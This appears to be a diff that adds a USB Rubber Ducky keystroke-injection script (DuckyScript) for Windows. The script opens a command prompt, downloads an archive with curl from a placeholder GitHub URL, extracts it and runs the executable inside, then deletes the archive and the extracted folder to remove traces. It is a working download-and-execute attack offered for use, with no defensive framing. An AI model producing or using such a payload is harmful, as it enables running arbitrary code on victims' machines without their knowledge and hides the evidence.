@@ -1,0 +1,24 @@
+DELAY 100
+GUI r
+DELAY 200
+STRING cmd
+ENTER
+DELAY 200
+STRING cd downloads
+ENTER
+DELAY 100
+STRING curl -LJO ur github for the exe
+ENTER
+DELAY 100
+STRING mkdir Main
+ENTER
+DELAY 100
+STRING tar -xf Main.zip -C Main
+ENTER
+DELAY 100
+STRING %USERPROFILE%\Downloads\Main\Main.exe
+ENTER
+DELAY 100
+STRING del /s /q %USERPROFILE%\Downloads\Main.zip && rmdir /s /q %USERPROFILE%\Downloads\Main && exit
+DELAY 100
+ENTER
